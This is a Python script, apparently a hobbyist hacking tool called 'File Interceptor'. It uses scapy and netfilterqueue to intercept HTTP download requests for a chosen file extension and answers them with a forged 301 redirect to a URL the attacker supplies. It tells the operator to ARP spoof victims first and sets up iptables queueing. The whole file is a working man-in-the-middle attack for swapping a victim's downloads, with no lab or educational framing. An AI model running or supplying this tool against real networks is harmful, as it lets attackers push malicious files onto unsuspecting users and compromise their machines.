#!/usr/bin/env python3

#Imports
import netfilterqueue
import scapy.all as scapy
import os
import sys
import subprocess

#ASCII Art
print("""
███████╗██╗██╗░░░░░███████╗██╗███╗░░██╗████████╗███████╗██████╗░░█████╗░███████╗██████╗░████████╗░█████╗░██████╗░
██╔════╝██║██║░░░░░██╔════╝██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
█████╗░░██║██║░░░░░█████╗░░██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝██║░░╚═╝█████╗░░██████╔╝░░░██║░░░██║░░██║██████╔╝
██╔══╝░░██║██║░░░░░██╔══╝░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗██║░░██╗██╔══╝░░██╔═══╝░░░░██║░░░██║░░██║██╔══██╗
██║░░░░░██║███████╗███████╗██║██║░╚███║░░░██║░░░███████╗██║░░██║╚█████╔╝███████╗██║░░░░░░░░██║░░░╚█████╔╝██║░░██║
╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░╚════╝░╚══════╝╚═╝░░░░░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝""")

#Functions
def setload(packet, load):
            packet[scapy.Raw].load = load
            del packet[scapy.IP].len
            del packet[scapy.IP].chksum
            del packet[scapy.TCP].chksum
            return packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            if scapy_packet[scapy.TCP].dport == 80:
                if fileext.encode() in scapy_packet[scapy.Raw].load:
                    print("\nFound a download request for a " + fileext + " file")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("\nNow replacing file to the file mentioned...")
                    modified_packet = setload(scapy_packet,  "HTTP/1.1 301 Moved Permanently\nLocation: " + location +"\n\n")
                    packet.set_payload(bytes(modified_packet))
        except IndexError:
            pass
    packet.accept()

ack_list = []

#Check if user is root
if not os.geteuid()==0:
    sys.exit('\nThis script must be run as root!')
else:
    print("\nUser is root, the script can continue...\n")


#Inputs
print("\nARP spoof and get to the man in the middle.")

print("\n\nWhat file extention needs to be spoofed? (.exe, .pdf, etc)\n")
fileext = input("> ")

print("\n\nEnter the direct download link for the file to be downloaded. (https://example.org/example.file)\n")
location = input("> ")

print("\n\nTell me a queue number that is not being used (0, 1, 2, etc)\n")
queuenum = input("> ")

subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", queuenum])

#Main
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(queuenum), process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("\nFlushing Iptables rules and exiting...")
    subprocess.run(["iptables", "--flush"])
